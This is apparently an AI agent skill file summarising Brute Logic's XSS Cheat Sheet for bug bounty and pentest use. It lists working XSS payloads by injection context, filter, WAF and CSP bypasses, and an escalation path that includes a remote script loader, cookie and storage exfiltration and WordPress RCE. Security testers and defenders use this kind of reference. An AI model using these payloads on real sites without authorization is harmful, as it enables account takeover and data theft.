---
name: xss-cheat-sheet
description: "Knowledge base from \"XSS Cheat Sheet\" by Rodolfo Assis (Brute Logic). Use when crafting XSS payloads for bug bounty/pentest — context-based vectors, filter/WAF/CSP bypasses, blind XSS, exploitation chains, and payload selection by reflection context."
---

<!-- argument-hint: [context, blocked char, or section name] -->

# XSS Cheat Sheet
**Author**: Rodolfo Assis "Brute Logic" | **Pages**: ~28 | **Sections**: 5 | **Generated**: 2026-09-23

## How to Use This Skill

- **Without arguments** — load the context→vector decision toolkit below
- **With a context** — ask about `attribute injection`, `postMessage`, `CSP bypass`; I read the matching section file
- **With a blocker** — say what the filter strips (parens, `>`, keywords) and I give the bypass
- **Browse** — ask "what sections do you have?"

When you ask about a topic not covered below, I read the relevant chapter file before answering.

---

## Core Frameworks & Decision Model

**Context-first taxonomy (the whole book's spine):**
1. Find the reflection.
2. Classify it: tag body / block-tag (`title style script textarea noscript pre xmp iframe`) / attribute-inline (no `>`) / attribute-source (`href src data action`) / JS-string / JS-logical-block / header / DOM-insert / XML.
3. Pick the matching vector — then adapt quote style to the delimiter actually used.

**Default vectors by context:**
- Tag body: `<svg onload=alert(1)>` (short, handler-based, no `<script>`)
- Block tag: `</tag><svg onload=alert(1)>`
- Attr, no `>`: `"onmouseover=alert(1)//` / `"autofocus/onfocus=alert(1)//`
- Source attr: `javascript:alert(1)` / `data:text/html,<svg onload=alert(1)>`
- JS string: `'-alert(1)-'` → escaped → `\'-alert(1)//` → logical block `'}alert(1);{'`
- Script block anywhere: `</script><svg onload=alert(1)>`

**Blocked-primitive rule:** name exactly what the filter removes (parens, `>`, `alert`, alphabetic, tag names, spaces, `//`), then apply the single technique that removes that dependency — escalate encoding only as deep as the decode pass (single→double `%253C`→entities→JS octal/hex/unicode).

**Impact ladder:** `alert(1)` → `alert(document.domain)` → remote script bootstrap (`with(document)body.appendChild(createElement('script')).src='//h/x.js'`) → cookie/DOM/storage exfil → blind-XSS mailer → platform RCE (WordPress plugin-editor nonce theft). httpOnly? exfil DOM/storage/CSRF tokens instead.

**Key heuristics:**
- Multiple reflections of one input → fragment-chain vectors (`'onload=alert(1)><svg/1='`)
- `addEventListener('message')` without origin check + frameable → postMessage XSS
- CSP whitelisting `*.google.com` → JSONP `?client=chrome&jsonp=` or AngularJS `ng-csp` bypass
- Upload surfaces → test filename, EXIF (`exiftool -Artist`), and SVG content for stored XSS
- `<base href=//h>` + relative native script = shortest XSS primitive
- Strict rule from the author: **use vectors exactly as classified** — HTML-fashion vs JS-fashion matters; adapt only the quote style

---

## Chapter Index

| # | Title | Key Content |
|---|-------|----------------|
| [ch01](chapters/ch01-basics.md) | Basics — HTML & JS Context Injections | context taxonomy, tag/attr/source/JS-string vectors |
| [ch02](chapters/ch02-advanced.md) | Advanced — Multi-Reflection, Upload, DOM, Frameworks | multi-reflection chains, file-upload XSS, DOM insert, PHP_SELF, postMessage, XML, CSTI/AngularJS, CRLF |
| [ch03](chapters/ch03-filter-bypass.md) | Filter Bypass — WAF, Sanitizer, CSP | case/encoding tricks, no-paren/no-alpha alerts, regex obfuscation, agnostic tags, separators, CSP bypass, 2nd-order |
| [ch04](chapters/ch04-exploitation.md) | Exploitation — alert(1) → Impact | remote script calls, WordPress→RCE, blind-XSS mailer, cookie steal, defacement, browser remote control |
| [ch05](chapters/ch05-miscellaneous.md) | Miscellaneous — Utilities & Encoding | one-shot vector, delays, shortest XSS, mobile handlers, Crosspwn, PHP static finder, Node RCE, ASCII table |

## Topic Index

- **AngularJS / CSTI** → ch02, ch03
- **Attribute/inline injection** → ch01
- **Blind XSS** → ch04
- **CSP bypass** → ch03
- **Cookie stealing / exfil** → ch04
- **CRLF header injection** → ch02
- **DOM XSS** → ch02
- **Encoding (entities/hex/octal/unicode)** → ch03, ch05
- **Event handlers (agnostic)** → ch03
- **File upload XSS** → ch02, ch03 (GIF disguise)
- **Filter/WAF bypass** → ch03
- **postMessage** → ch02, ch03, ch05 (Crosspwn)
- **Remote script / C2** → ch04
- **RCE (WordPress, Node.js)** → ch04, ch05
- **Stored / 2nd-order** → ch03
- **XML XSS** → ch02

## Supporting Files

- [glossary.md](glossary.md) — all key terms with definitions
- [patterns.md](patterns.md) — techniques: context mapping, fragment chaining, bypass selection, bootstraps
- [cheatsheet.md](cheatsheet.md) — context→payload and blocked→bypass decision tables

---

## Scope & Limits

2018-era material targeting Firefox 58/Chrome 63 — browser quirks may differ today; methodology and context model remain current. Payloads are PoC-grade (`alert`-family); adapt for your engagement scope and authorization. Not a substitute for testing methodology skills (see `bug-bounty-playbook`, `zseano-methodology` if installed). Source/version/review metadata: `sources.md`.
